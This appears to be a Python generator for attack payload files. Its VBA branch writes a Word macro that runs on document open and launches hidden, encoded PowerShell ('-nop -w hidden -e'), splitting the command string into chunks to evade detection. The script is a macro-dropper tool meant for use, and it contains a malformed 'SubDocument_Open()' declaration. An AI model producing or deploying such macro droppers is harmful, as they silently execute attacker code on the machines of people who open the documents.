import random

def file_creator(extension, final_output):
    filename = ""
    for _ in range(5):
        filename += str(random.randint(1,9))
    
    if extension == 'ps1':
        with open(f"{filename}.{extension}", "w") as f:
            f.write(f'Write-Host "{final_output}"\nGet-Process')
    elif extension == 'bat':
        #TODO: Might need fixing...
        with open(f"{filename}.{extension}", "w") as f:
            f.write(f'''@echo off\npowershell -Command "Write-Host '{final_output}'"''')
    elif extension == 'vba':

        string = f"powershell.exe -nop -w hidden -e {final_output}"
        stripped_string = ""
        n = 50
        for i in range(0, len(string), n):
            stripped_string += "Str = Str + " + '"' + string[i:i+n] + '"\n\t'

        with open(f"{filename}.{extension}", "w") as f:
            f.write(f'''
Sub AutoOpen()
    MyMacro
End Sub

SubDocument_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    {stripped_string}
    CreateObject("Wscript.Shell").Run Str
End Sub
            ''')
